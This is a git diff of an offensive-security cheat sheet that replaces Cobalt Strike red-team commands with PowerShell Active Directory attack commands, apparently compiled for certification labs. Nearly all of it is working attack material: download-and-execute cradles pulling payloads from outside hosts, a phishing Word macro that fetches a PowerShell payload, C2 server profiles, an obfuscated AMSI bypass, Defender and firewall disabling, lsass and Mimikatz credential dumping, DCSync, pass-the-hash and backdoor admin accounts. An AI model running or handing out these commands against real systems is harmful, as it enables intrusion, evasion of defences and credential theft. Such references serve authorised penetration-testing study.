@@ -1,8 +1,8 @@
-# Certified Read Team Operator (CRTO) - Cheatsheet 
+# Certified Read Team Expert (CRTE) - Cheatsheet 
 
- **Name** : **CRTO - Red Teaming Command Cheat Sheet (Cobalt Strike)**
- 
- **Course Link** : https://training.zeropointsecurity.co.uk/courses/red-team-ops
+ **Name** : **CRTE - Active Directory Command Cheat Sheet (Powershell)**
+
+ **Course Link** : https://www.alteredsecurity.com/redteamlab
 
  **Compiled By** : **Nikhil Raj ( Twitter: https://twitter.com/0xn1k5 | Blog: https://organicsecurity.in )**
 
@@ -12,1508 +12,1273 @@
 
  **Disclaimer** : This cheat sheet has been compiled from multiple sources with the objective of aiding fellow pentesters and red teamers in their learning. The credit for all the tools and techniques belongs to their original authors. I have added a reference to the original source at the bottom of this document.  
 
-### MISC
+#### Basic Operations
 
 ```powershell
-# Run a python3 webserver
-$ python3 -m http.server
+# Loading powerview locally
+ps> . C:\AD\Tools\PowerView.ps1
 
-# Check outbound access to TeamServer
-$ iwr -Uri http://nickelviper.com/a
+# Loading ActiveDirectory Module (Also works in Constrained Language Mode)
+Import-Module C:\AD\Tools\ADModule-master\Microsoft.ActiveDirectory.Management.dll
+Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
 
-# Change incoming firewall rules
-beacon> powerpick New-NetFirewallRule -DisplayName "Test Rule" -Profile Domain -Direction Inbound -Action Allow -Protocol TCP -LocalPort 8080
-beacon> powerpick Remove-NetFirewallRule -DisplayName "Test Rule"
+# Loading tools remotely using download and execute cradle
+ps> iex (New-Object Net.WebClient).DownloadString('https://webserver/payload.ps1')
+ps> iex (iwr 'http://192.168.230.1/evil.ps1' -UseBasicParsing)
 
-## Encode the powershell payload for handling extra quotes 
+# File Download using windows binary
+bitsadmin /transfer WindowsUpdates /priority normal http://127.0.0.1:8080/Loader.exe C:\\User\\Public\\Loader.exe
 
-# Powershell
-PS C:\> $str = 'IEX ((new-object net.webclient).downloadstring("http://nickelviper.com/a"))'
-PS C:\> [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
+# File Transfer using shared drive
+echo F | xcopy \\us-jump\C$\Users\Public\lsass.dmp C:\AD\Tools\lsass.dmp
 
-#Linux 
-$ echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.31/shell.ps1')" | iconv -t UTF-16LE | base64 -w 0
-
-# Final Command
-powershell -nop -enc <BASE64_ENCODED_PAYLOAD>
+# Base 64 encode and decode
+certutil -decode foo.b64 foo.exe
+certutil -encode foo.exe foo.b64
 
 ```
 
 
-### Command & Control
-
-- Setting up DNS records for DNS based beacon payloads
+#### Bypassing Endpoint Security, Applocker and Powershell Logging
 
 ```powershell
-# Set below DNS Type A & NS records, where IP points to TeamServer
+1. Powershell Logging
+# Use Invisi-Shell to bypass powershell logging (has inbuild AMSI evasion)
+# NOTE: Invisi-Shell may interfere with some process like Saftelykatz, use Loader.exe for such cases
 
-@    | A  | 10.10.5.50
-ns1  | A  | 10.10.5.50
-pics | NS | ns1.nickelviper.com
+# With Admin Rights
+C:\AD\Tools\InviShell\RunWithPathAsAdmin.bat
+# Without Admin Rights (modifies registry entries, and is recommended method)
+C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
 
-# Verify the DNS configuration from TeamServer, it should return 0.0.0.0
-$ dig @ns1.nickelviper.com test.pics.nickelviper.com +short
+2. AV Evasion
 
-# Use pics.nickelviper.com as DNS Host and Stager in Listener Configuration
-
-```
-
-- Start the team server and run as service
-
-```powershell
-> sudo ./teamserver 10.10.5.50 Passw0rd! c2-profiles/normal/webbug.profile
-```
-
-```powershell
-$ sudo vim /etc/systemd/system/teamserver.service
-
-[Unit]
-Description=Cobalt Strike Team Server
-After=network.target
-StartLimitIntervalSec=0
-
-[Service]
-Type=simple
-Restart=always
-RestartSec=1
-User=root
-WorkingDirectory=/home/attacker/cobaltstrike
-ExecStart=/home/attacker/cobaltstrike/teamserver 10.10.5.50 Passw0rd! c2-profiles/normal/webbug.profile
-
-[Install]
-WantedBy=multi-user.target
-
-$ sudo systemctl daemon-reload
-$ sudo systemctl status teamserver.service
-$ sudo systemctl start teamserver.service
-$ sudo systemctl enable teamserver.service
-```
-
-- Enable Hosting of Web Delivery Payloads via agscript client in headless mode
-
-```powershell
-$ cat host_payloads.cna
-
-# Connected and ready
-on ready {
-
-    # Generate payload
-    $payload = artifact_payload("http", "powershell", "x64");
-
-    # Host payload
-    site_host("10.10.5.50", 80, "/a", $payload, "text/plain", "Auto Web Delivery (PowerShell)", false);
-}
-
-# Add below command in "/etc/systemd/system/teamserver.service" file
-
-ExecStartPost=/bin/sh -c '/usr/bin/sleep 30; /home/attacker/cobaltstrike/agscript 127.0.0.1 50050 headless Passw0rd! host_payloads.cna &'
-
-```
-
-```powershell
-# Custom C2 Profile for CRTO
-set sample_name "Dumbledore";
-set sleeptime "5000";
-set jitter    "20";
-set useragent "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36";
-set host_stage "true";
-
-post-ex {
-        set amsi_disable "true";
-	set spawnto_x86 "%windir%\\syswow64\\dllhost.exe";
-	set spawnto_x64 "%windir%\\sysnative\\dllhost.exe";
-}
-
-http-get {
-	set uri "/cat.gif /image /pixel.gif /logo.gif";
-
-	client {
-        	# customize client indicatorsi
-		header "Accept" "text/html,image/avif,image/webp,*/*";
-		header "Accept-Language" "en-US,en;q=0.5";
-		header "Accept-Encoding" "gzip, deflate";
-		header "Referer" "https://www.google.com";
-
-		parameter "utm" "ISO-8898-1";
-		parameter "utc" "en-US";
-
-		metadata{
-			base64;
-			header "Cookie";
-		}
-	}
-
-	server {
-		# customize soerver indicators
-		header "Content-Type" "image/gif";
-		header "Server" "Microsoft IIS/10.0";	
-		header "X-Powered-By" "ASP.NET";	
-
-
-
-		output{
-			prepend "\x01\x00\x01\x00\x00\x02\x01\x44\x00\x3b";
-                        prepend "\xff\xff\xff\x21\xf9\x04\x01\x00\x00\x00\x2c\x00\x00\x00\x00";
-                        prepend "\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\x00\x00";
-			print;
-		}
-	}
-}
-
-http-post {
-	set uri "/submit.aspx /finish.aspx";
-
-	client {
-
-		header "Content-Type" "application/octet-stream";
-		header "Accept" "text/html,image/avif,image/webp,*/*";
-		header "Accept-Language" "en-US,en;q=0.5";
-		header "Accept-Encoding" "gzip, deflate";
-		header "Referer" "https://www.google.com";
-		
-		id{
-			parameter "id";
-		}
-
-		output{
-			print;
-		}
-
-	}
-
-
-	server {
-		# customize soerver indicators
-		header "Content-Type" "text/plain";
-		header "Server" "Microsoft IIS/10.0";	
-		header "X-Powered-By" "ASP.NET";	
-
-		output{
-			print;
-		}
-	}
-}
-
-http-stager {
-
-	server {
-		header "Content-Type" "application/octet-stream";
-		header "Server" "Microsoft IIS/10.0";	
-		header "X-Powered-By" "ASP.NET";	
-	}
-}
-
-```
-
-### Defender Antivirus
-
-```powershell
-
-# Compile the Artifact kit
-$ ./build.sh pipe VirtualAlloc 277492 5 false false /mnt/c/Tools/cobaltstrike/artifacts
-
-# Compile the resource kit
-$ ./build.sh /mnt/c/Tools/cobaltstrike/resources
-
-# Verify if the payload is AV Safe
-PS> C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f C:\Payloads\smb_x64.svc.exe
-PS> C:\Tools\ThreatCheck\ThreatCheck\bin\Debug\ThreatCheck.exe -f C:\Payloads\http_x64.ps1 -e AMSI
-
-# Load the CNA file: Cobalt Strike > Script Manager > Load_ and select the CNA
-# Use Payloads > Windows Stageless Generate All Payloads to replace all of your payloads in `C:\Payloads`
-
-# Disable AMSI in Malleable C2 profile
-$ vim c2-profiles/normal/webbug.profile
-
-#Right above the `http-get` block, add the following:
-post-ex {
-        set amsi_disable "true";
-}
-
-# Verify the modified C2 profile
-attacker@ubuntu ~/cobaltstrike> ./c2lint c2-profiles/normal/webbug.profile
-
-# Creating custom C2 profiles
-https://unit42.paloaltonetworks.com/cobalt-strike-malleable-c2-profile/
-
-# Note: `amsi_disable` only applies to `powerpick`, `execute-assembly` and `psinject`.  It **does not** apply to the powershell command.
-
-# Behaviour Detections (change default process for fork & run)
-beacon> spawnto x64 %windir%\sysnative\dllhost.exe
-beacon> spawnto x86 %windir%\syswow64\dllhost.exe
-
-# Change the default process for psexec
-beacon> ak-settings spawnto_x64 C:\Windows\System32\dllhost.exe
-beacon> ak-settings spawnto_x86 C:\Windows\SysWOW64\dllhost.exe
-
-# Disable Defender from local powershell session
+# Disable Windows Defender & AMSI bypass script
 Get-MPPreference
 Set-MPPreference -DisableRealTimeMonitoring $true
-Set-MPPreference -DisableIOAVProtection $true
-Set-MPPreference -DisableIntrusionPreventionSystem $true
+Set-MpPreference -DisableIOAVProtection $true
+"C:\Program Files\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
 
-# AMSI bypass
+# AMSI Bypass
 S`eT-It`em ( 'V'+'aR' +  'IA' + ('blE:1'+'q2')  + ('uZ'+'x')  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    Get-varI`A`BLE  ( ('1Q'+'2U')  +'zX'  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f('Uti'+'l'),'A',('Am'+'si'),('.Man'+'age'+'men'+'t.'),('u'+'to'+'mation.'),'s',('Syst'+'em')  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f('a'+'msi'),'d',('I'+'nitF'+'aile')  ),(  "{2}{4}{0}{1}{3}" -f ('S'+'tat'),'i',('Non'+'Publ'+'i'),'c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )
 
+# Use AMSI Trigger and DefenderCheck
+cmd> AmsiTrigger_x64.exe -i C:\AD\Tools\Invoke\PowerShellTcp_Detected.ps1
+cmd> DefenderCheck.exe PowerUp.ps1
+
+# Bypass AMSI and ETW based detection by loading the binary using loader utility
+C:\Users\Public\Loader.exe -path http://192.168.100.X/SafetyKatz.exe
+C:\Users\Public\AssemblyLoad.exe http://192.168.100.X/Loader.exe -path http://192.168.100.X/SafetyKatz.exe
+
+3. Applocker & WDAC Bypas
+
+# Check if Powershell is running in Constrained Language Mode (It may be because of Applocker or WDAC)
+$ExecutionContext.SessionState.LanguageMode
+
+# Check applocker policy for Application Whitelisting via Powerview and Registry (reg.exe)
+Get-AppLockerPolicy –Effective
+Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
+Get-ChildItem "HKLM:Software\Policies\Microsoft\Windows\SrpV2"
+Get-ChildItem "HKLM:Software\Policies\Microsoft\Windows\SrpV2\Exe"
+reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2
+
+# Identify the GPO Policy responsible Applocker
+Get-DomainGPO -Domain us.techcorp.local | ? { $_.DisplayName -like "*PAW*" } | select displayname, gpcfilesyspath
+
+# Download the GPO Registry Policy file from sysvol share on AD to view applocker policy details
+type "\\us.techcorp.local\SysVol\us.techcorp.local\Policies\{AFC6881A-5AB6-41D0-91C6-F2390899F102}\Machine\Registry.pol"
+
+# Based on policy we need to identify the bypass technique for Applocker (like Whitelisted path)
+Get-Acl C:\Windows\Tasks | fl
+
+# Check Windows Device Guard (WDAC) enforcement policy
+wmi
+Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard
+
+# Bypass for WDAC using rundll32.exe and comsvcs.dll to dump the lsass process
+tasklist /FI "IMAGENAME eq lsass.exe"
+rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 708 C:\Users\Public\lsass.dmp full
+echo F | xcopy \\us-jump\C$\Users\Public\lsass.dmp C:\AD\Tools\lsass.dmp
+Invoke-Mimikatz -Command "sekurlsa::minidump C:\AD\Tools\lsass.DMP"
 
 ```
 
 
-
-
-### Initial Compromise
-
--  Enumerating OWA to identify valid user and conducting password spraying attack
+#### Lateral Movement
 
 ```powershell
-# Identify the mail server of given domain
-$ dig cyberbotic.io
-$ ./dnscan.py -d cyberbotic.io -w subdomains-100.txt
+# Check for access on other computers using current users session
+Find-LocalAdminAccess -Verbose
+Find-WMILocalAdminAccess.ps1
+Find-PSRemotingLocalAdminAccess.ps1
+cme smb <COMPUTERLIST> -d <DOMAIN> -u <USER> -H <NTLM HASH>
+cme smb <COMPUTERNAME> -d <DOMAIN> -u <USER> -H <NTLM HASH> -X <COMMAND>
 
-# Idenitfy the NETBIOS name of target domain
-ps> ipmo C:\Tools\MailSniper\MailSniper.ps1
-ps> Invoke-DomainHarvestOWA -ExchHostname mail.cyberbotic.io
+# Use WMI for remote session
+Get-WmiObject -Class win32_operatingsystem -ComputerName us-dc.us.techcorp.local
 
-# Extract Employee Names (FirstName LastName) and Prepare Username List
-$ ~/namemash.py names.txt > possible.txt
+# Create PS Session 
+$usmgmt = New-PSSession -ComputerName us-mgmt
+Enter-PSSession $usmgmt
 
-# Validate the username to find active/real usernames
-ps> Invoke-UsernameHarvestOWA -ExchHostname mail.cyberbotic.io -Domain cyberbotic.io -UserList .\Desktop\possible.txt -OutFile .\Desktop\valid.txt
+$passwd = ConvertTo-SecureString 't7HoBF+m]ctv.]' -AsPlainText -Force
+$creds = New-Object System.Management.Automation.PSCredential ("us-mailmgmt\administrator", $passwd)
+$mailmgmt = New-PSSession -ComputerName us-mailmgmt -Credential $creds
+Enter-PSSession $mailmgmt
 
-# Conduct Password Spraying attack with known Password on identified users
-ps> Invoke-PasswordSprayOWA -ExchHostname mail.cyberbotic.io -UserList .\Desktop\valid.txt -Password Summer2022
+# Invoke Command using Powershell Remoting
+Invoke-Command -Scriptblock {Get-Process} -Session $usmgmt
+Invoke-Command -Scriptblock {Get-Process} -ComputerName (Get-Content <list-of-server>)
+Invoke-Command -FilePath C:\scripts\Get-PassHases.ps1 -ComputerName (Get-Content <list-of-server>)
+Invoke-Command -FilePath C:\AD\Tools\Invoke-Mimi.ps1 -Session $mailmgmt
+Invoke-Command -Scriptblock ${function:Get-PassHashes} -ComputerName (Get-Content <list-of-server>)
+Invoke-Command -Scriptblock ${function:Get-PassHashes} -ComputerName (Get-Content <list-of-server>) -ArgumentList
 
-# Use Identified credentials to download Global Address List
-ps> Get-GlobalAddressList -ExchHostname mail.cyberbotic.io -UserName cyberbotic.io\iyates -Password Summer2022 -OutFile .\Desktop\gal.txt
-```
+# Use winrs for ps remoting without logging
+winrs -remote:server1 -u:server1\administrator -p:Pass@1234 hostname
+winrs -remote:US-MAILMGMT -u:US-MAILMGMT\administrator -p:';jv-2@6e#m]!8O' cmd.exe
 
-- Create a malicious Office file having embedded macro
+# Runas cmd as another user
+runas /netonly /user:us\serviceaccount  cmd.exe
 
-```vbscript
-# Step 1: Open a blank word document "Document1". Navigate to  View > Macros > Create. Changes macros in to Document1. Name the default macro function as AutoOpen. Paste the below content and run for testing
+# Manage Firewall Port Access
+netsh advfirewall firewall add rule name="Allow Port 8080" protocol=TCP dir=in localport=8080 action=allow
+netsh advfirewall firewall add rule name="Allow Port 8081" protocol=TCP dir=in localport=8081 action=allow
+netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=192.168.100.X
 
-Sub AutoOpen()
+# disable firewall
+Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
+powershell.exe -c 'Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False'
 
-  Dim Shell As Object
-  Set Shell = CreateObject("wscript.shell")
-  Shell.Run "notepad"
+# Add user to local admin and RDP group and enable RDP on firewall
+net user <USERNAME> <PASSWORD> /add /Y  && net localgroup administrators <USERNAME> /add && net localgroup "Remote Desktop Users" <USERNAME> /add && reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f && netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
 
-End Sub
+````
 
-
-# Step 2: Generate a payload for web delivery (Attacks > Scripted Web Delivery (S) and generate a 64-bit PowerShell payload with your HTTP/DNS listener). Balance the number of quotes
-
-
-Sub AutoOpen()
-
-  Dim Shell As Object
-  Set Shell = CreateObject("wscript.shell")
-	Shell.Run "powershell.exe -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://nickelviper.com/a'))"""
-
-End Sub
-
-# Step 3: Save the document as .doc file and send it as phising email
-
-```
-
-
-### Host Reconnaissance
+#### Lateral Movement - Credentials Harvesting
 
 ```powershell
-# Identify running process like AV, EDR or any monitoring and logging solution
-beacon> ps
+# Check if lsass.exe is running as protected process
+Get-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name "RunAsPPL" 
 
-# Use Seatbealt to enumerate about system
-beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe -group=system
+## Dumping Credentials
+Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
+Invoke-Mimikatz -Command '"sekurlsa::logonpassword"'
+Invoke-Mimikatz -Command '"lsadump::lsa /patch"'
+Invoke-Mimikatz -Command '"lsadump::sam"'
 
-# Screenshot, Clipboard, Keylogger and User Sessions of currently logged in user
-beacon> screenshot
-beacon> clipboard
-beacon> net logons
+# Dump Secrets stored in windows vault
+Invoke-Mimikatz -Command '"vault::list"'
+Invoke-Mimikatz -Command '"vault::cred /patch"'
+Invoke-Mimikatz -Command '"sekurlsa::minidump lsass.dmp"'
 
-beacon> keylogger
-beacon> job
-beacon> jobkill 3
+# Other Mimikatz based utility for duping lsass.exe
+SafetyKatz.exe "sekurlsa::ekeys"
+SharpKatz.exe --Command ekeys
+rundll32.exe C:\Dumpert\Outflank\Dumpert.dll,Dump
+pypykatz.exe live lsa
+
+tasklist /FI "IMAGENAME eq lsass.exe" 
+rundll32.exe C:\windows\System32\comsvcs.dll,MiniDump <lsass_process_ID> C:\Users\Public\lsass.dmp full
+
+.\mimikatz.exe
+mimikatz # sekurlsa::minidump c:\Ad\Tools\lsass.dmp
+mimikatz # privilege::debug
+mimikatz # sekurlsa::keys
+mimikatz # exit
+
+# Lateral Movement - OverPass The Hash
+Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:us.techcorp.local /aes256:aes /run:powershell.exe"'
+SafetyKatz.exe "sekurlsa::pth /user:Administrator /domain:us.techcorp.local /aes256:aes /run:powershell.exe" "exit"
+
+# Generate TGT and inject in current session for double hopping (no admin rights for 1st command)
+Rubeus.exe asktgt /user:administrator /rc4:ntlmHash /ptt
+Rubeus.exe asktgt /user:administrator /aes256:<key> /opsec /createnetonly:c:\Windows\System32\cmd.exe /show /ptt
+
+# DCSync 
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"'
+SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt" "exit"
 ```
 
-
-### Host Persistence (Normal + Privilleged)
-
-```powershell
-
-# Default location for powershell
-C:\windows\syswow64\windowspowershell\v1.0\powershell
-C:\Windows\System32\WindowsPowerShell\v1.0\powershell
-
-# Encode the payload for handling extra quotes 
-
-# Powershell
-PS C:\> $str = 'IEX ((new-object net.webclient).downloadstring("http://nickelviper.com/a"))'
-PS C:\> [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
-
-#Linux 
-$ echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.31/shell.ps1')" | iconv -t UTF-16LE | base64 -w 0
-
-# Final Command
-powershell -nop -enc <BASE64_ENCODED_PAYLOAD>
-
-# Common userland persistence methods include HKCU / HKLM Registry Autoruns, Scheduled Tasks, Startup Folder
-
-# Persistance - Task Scheduler
-beacon> execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc SQBFAFgAIAAoAC...GEAIgApACkA" -n "Updater" -m add -o hourly
-
-# Persistance - Startup Folder
-beacon> execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t startupfolder -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc SQBFAFgAIAAo..vAGEAIgApACkA" -f "UserEnvSetup" -m add
-
-# Persistance - Registry Autorun
-beacon> cd C:\ProgramData
-beacon> upload C:\Payloads\http_x64.exe
-beacon> mv http_x64.exe updater.exe
-beacon> execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t reg -c "C:\ProgramData\Updater.exe" -a "/q /n" -k "hkcurun" -v "Updater" -m add
-
-# Persistance COM Hijacks
-
-# Persistance - Privilleged System User
-
-# Windows Service
-beacon> cd C:\Windows
-beacon> upload C:\Payloads\tcp-local_x64.svc.exe
-beacon> mv tcp-local_x64.svc.exe legit-svc.exe
-beacon> execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t service -c "C:\Windows\legit-svc.exe" -n "legit-svc" -m add
-
-# Register WMI event to trigger our payload
-beacon> cd C:\Windows
-beacon> upload C:\Payloads\dns_x64.exe
-beacon> powershell-import C:\Tools\PowerLurk.ps1
-beacon> powershell Register-MaliciousWmiEvent -EventName WmiBackdoor -PermanentCommand "C:\Windows\dns_x64.exe" -Trigger ProcessStart -ProcessName notepad.exe
-
-```
-
-
-### Privilege Escalation
+#### Post Exploitation
 
 ```powershell
-# Query and Manage all the installed services
-beacon> powershell Get-Service | fl
-beacon> run wmic service get name, pathname
-beacon> run sc query
-beacon> run sc qc VulnService2
-beacon> run sc stop VulnService1
-beacon> run sc start VulnService1
-
-# Use SharpUp to find exploitable services
-beacon> execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit 
-
-# CASE 1: Unquoted Service Path (Hijack the service binary search logic to execute our payload)
-beacon> execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit UnquotedServicePath
-beacon> powershell Get-Acl -Path "C:\Program Files\Vulnerable Services" | fl
-beacon> cd C:\Program Files\Vulnerable Services
-beacon> upload C:\Payloads\tcp-local_x64.svc.exe
-beacon> mv tcp-local_x64.svc.exe Service.exe
-beacon> run sc stop VulnService1
-beacon> run sc start VulnService1
-beacon> connect localhost 4444
-
-# CASE 2: Weak Service Permission (Possible to modify service configuration)
-beacon> execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit ModifiableServices
-beacon> powershell-import C:\Tools\Get-ServiceAcl.ps1
-beacon> powershell Get-ServiceAcl -Name VulnService2 | select -expand Access
-beacon> run sc qc VulnService2
-beacon> mkdir C:\Temp
-beacon> cd C:\Temp
-beacon> upload C:\Payloads\tcp-local_x64.svc.exe
-beacon> run sc config VulnService2 binPath= C:\Temp\tcp-local_x64.svc.exe
-beacon> run sc qc VulnService2
-beacon> run sc stop VulnService2
-beacon> run sc start VulnService2
-beacon> connect localhost 4444
-
-# CASE 3: Weak Service Binary Permission (Overwite the service binary due to weak permission)
-beacon> execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit ModifiableServices
-beacon> powershell Get-Acl -Path "C:\Program Files\Vulnerable Services\Service 3.exe" | fl
-PS C:\Payloads> copy "tcp-local_x64.svc.exe" "Service 3.exe"
-beacon> run sc stop VulnService3
-beacon> cd "C:\Program Files\Vulnerable Services"
-beacon> upload C:\Payloads\Service 3.exe
-beacon> run sc start VulnService3
-beacon> connect localhost 4444
+## Limit this command if there are too many files ;)
+tree /f /a C:\Users
 
-# UAC Bypass
-beacon> run whoami /groups
-beacon> elevate uac-schtasks tcp-local
-beacon> run netstat -anop tcp
-beacon> connect localhost 4444
-```
+# Web.config
+C:\inetpub\www\*\web.config
 
+# Unattend files
+C:\Windows\Panther\Unattend.xml
 
-### Credential Theft
+# RDP config files
+C:\ProgramData\Configs\
 
-```powershell
-# "!" symbol is used to run command in elevated context of System User
-# "@" symbol is used to impersonate beacon thread token
+# Powershell scripts/config files
+C:\Program Files\Windows PowerShell\
 
-# Dump the local SAM database 
-beacon> mimikatz !lsadump::sam
+# PuTTy config
+C:\Users\[USERNAME]\AppData\LocalLow\Microsoft\Putty
 
-# Dump the logon passwords (Plain Text + Hashes) from LSASS.exe for currently logged on users
-beacon> mimikatz !sekurlsa::logonpasswords
+# FileZilla creds
+C:\Users\[USERNAME]\AppData\Roaming\FileZilla\FileZilla.xml
 
-# Dump the encryption keys used by Kerberos of logged on users (hashes incorrectly labelled as des_cbc_md4)
-beacon> mimikatz !sekurlsa::ekeys
+# Jenkins creds (also check out the Windows vault, see above)
+C:\Program Files\Jenkins\credentials.xml
 
-# Dump Domain Cached Credentials (cannotbe be used for lateral movement unless cracked)
-beacon> mimikatz !lsadump::cache
+# WLAN profiles
+C:\ProgramData\Microsoft\Wlansvc\Profiles\*.xml
 
-# List the kerberos tickets cached in current logon session or all logon session (privileged session)
-beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
+# TightVNC password (convert to Hex, then decrypt with e.g.: https://github.com/frizb/PasswordDecrypts)
+Get-ItemProperty -Path HKLM:\Software\TightVNC\Server -Name "Password" | select -ExpandProperty Password
 
-# Dump the TGT Ticket from given Logon Session (LUID)
-beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x7049f /service:krbtgt
+# Look for SAM file
+Get-ChildItem -path C:\Windows\Repair\* -include *.SAM*,*.SYSTEM* -force -Recurse 
+Get-ChildItem -path C:\Windows\System32\config\RegBack\*  -include *.SAM*,*.SYSTEM* -force -Recurse
+Get-ChildItem -path C:\* -include *.SAM*,*.SYSTEM* -force -Recurse 
 
-# DC Sync
-beacon> make_token DEV\nlamb F3rrari
-beacon> dcsync dev.cyberbotic.io DEV\krbtgt
+# Check Registry for password
+reg query HKLM /f password /t REG_SZ /s
+reg query HKCU /f password /t REG_SZ /s
 
-# Dump krbtgt hash from DC (locally)
-beacon> mimikatz !lsadump::lsa /inject /name:krbtgt
-```
+# Check for unattend and sysgrep files
+Get-ChildItem -path C:\* -Recurse -Include *Unattend.xml*
+Get-ChildItem -path C:\Windows\Panther\* -Recurse -Include *Unattend.xml* 
+Get-ChildItem -path C:\Windows\system32\* -Recurse -Include *sysgrep.xml*, *sysgrep.inf* 
+Get-ChildItem -path C:\* -Recurse -Include *Unattend.xml*, *sysgrep.xml*, *sysgrep.inf* 
 
+# Look for powershell history files
+Get-Childitem -Path C:\Users\* -Force -Include *ConsoleHost_history* -Recurse -ErrorAction SilentlyContinue
 
-### Domain Recon
+# Hardcoded Password in scripts
+Get-ChildItem -path C:\*  -Recurse -Include *.xml,*.ps1,*.bat,*.txt  | Select-String "password"| Export-Csv C:\Scripts\Report.csv -NoTypeInformation
+Get-ChildItem -path C:\*  -Recurse -Include *.xml,*.ps1,*.bat,*.txt  | Select-String "creds"| Export-Csv C:\Scripts\Report.csv -NoTypeInformation
 
-- Domain Recon using Power View
+# Azure token
+Get-ChildItem -path "C:\Users\*" -Recurse -Include *accessTokens.json*, *TokenCache.dat*, *AzureRmContext.json*
 
-```powershell
-# Use PowerView for domain enumeration
-beacon> powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1
+# Dump Password Vault
+[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
+$vault = New-Object Windows.Security.Credentials.PasswordVault
+$vault.RetrieveAll() | % { $_.RetrievePassword();$_ }
 
-# Get Domain Information
-beacon> powerpick Get-Domain -Domain <>
+# Find the IDs of protected secrets for a specific user
+dir C:\Users\[USERNAME]\AppData\Local\Microsoft\Credentials
 
-# Get Domain SID
-beacon> powerpick Get-DomainSID
+# Get information, including the used master key ID, from a specific secret (take the path from above)
+dpapi::cred /in:C:\Users\[USERNAME]\AppData\Local\Microsoft\Credentials\1EF01CC92C17C670AC9E57B53C9134F3
 
-# Get Domain Controller
-beacon> powerpick Get-DomainController | select Forest, Name, OSVersion | fl
+# IF YOU ARE PRIVILEGED
+# Dump all master keys from the current system
+sekurlsa::dpapi
 
-# Get Forest Information
-beacon> powerpick Get-ForestDomain -Forest <>
+# IF YOU ARE NOT PRIVILEGED (session as target user required)
+# Get the master key from the domain using RPC (the path contains the user SID, and then the ID of the masterkey identified in the previous step)
+dpapi::masterkey /rpc /in:C:\Users\[USERNAME]\AppData\Roaming\Microsoft\Protect\S-1-5-21-3865823697-1816233505-1834004910-1124\dd89dddf-946b-4a80-9fd3-7f03ebd41ff4
 
-# Get Domain Policy 
-beacon> powerpick Get-DomainPolicyData | select -expand SystemAccess
-
-# Get Domain users
-beacon> powerpick Get-DomainUser -Identity jking -Properties DisplayName, MemberOf | fl
-
-# Identify Kerberoastable/ASEPRoastable User/Uncontrained Delegation
-beacon> powerpick Get-DomainUser | select cn,serviceprincipalname
-beacon> powerpick Get-DomainUser -PreauthNotRequired
-beacon> powerpick Get-DomainUser -TrustedToAuth
-
-# Get Domain Computer
-beacon> powerpick Get-DomainComputer -Properties DnsHostName | sort -Property DnsHostName
-
-# Idenitify Computer Accounts where unconstrained and constrained delefation is enabled
-beacon> powerpick Get-DomainComputer -Unconstrained | select cn, dnshostname
-beacon> powerpick Get-DomainComputer -TrustedToAuth | select cn, msdsallowedtodelegateto
-
-# Get Domain OU
-beacon> powerpick Get-DomainOU -Properties Name | sort -Property Name
-
-# Identify computers in given OU
-beacon> powerpick Get-DomainComputer -SearchBase "OU=Workstations,DC=dev,DC=cyberbotic,DC=io" | select dnsHostName
-
-# Get Domain group (Use -Recurse Flag)
-beacon> powerpick Get-DomainGroup | where Name -like "*Admins*" | select SamAccountName
-
-# Get Domain Group Member
-beacon> powerpick Get-DomainGroupMember -Identity "Domain Admins" | select MemberDistinguishedName
